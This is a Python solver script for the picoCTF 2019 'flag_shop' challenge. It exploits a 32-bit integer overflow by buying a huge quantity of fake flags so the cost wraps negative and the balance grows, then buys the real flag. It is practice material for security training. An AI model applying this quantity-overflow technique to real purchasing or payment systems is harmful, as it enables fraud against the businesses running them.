"""Solver for challenge 49 flag_shop (picoCTF 2019, General Skills).

32-bit integer overflow: total_cost = n * 900 wraps past INT_MAX and goes
negative, so the balance check passes and the new balance grows. n = 2386095
gives (n*900) mod 2**32 as a large negative, pushing the balance over 100000,
then buy 1 real flag.

Usage: solve_49_flag_shop.py <host> <port>
"""
import re
import socket
import sys


def runtil(f, marker: bytes) -> bytes:
    data = b''
    while marker not in data:
        chunk = f.read(1)
        if not chunk:
            break
        data += chunk
    return data


def solve(host: str, port: int) -> str:
    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile('rwb', buffering=0)
    # buy fake flags with overflowing quantity
    runtil(f, b'2.')
    f.write(b'2\n')
    runtil(f, b'flags?')
    n = 2386095
    assert (n * 900) % 2**32 > 2**31  # wraps negative as signed int32
    f.write(str(n).encode() + b'\n')
    runtil(f, b'2.')
    # buy 1 real flag
    f.write(b'1\n')
    runtil(f, b'flags?')
    f.write(b'1\n')
    out = b''
    try:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 16384:
                break
    except Exception:
        pass
    s.close()
    m = re.search(rb'academy\{[^}]+\}', out)
    return m.group(0).decode() if m else out.decode(errors='replace')


if __name__ == '__main__':
    print(solve(sys.argv[1], int(sys.argv[2])))
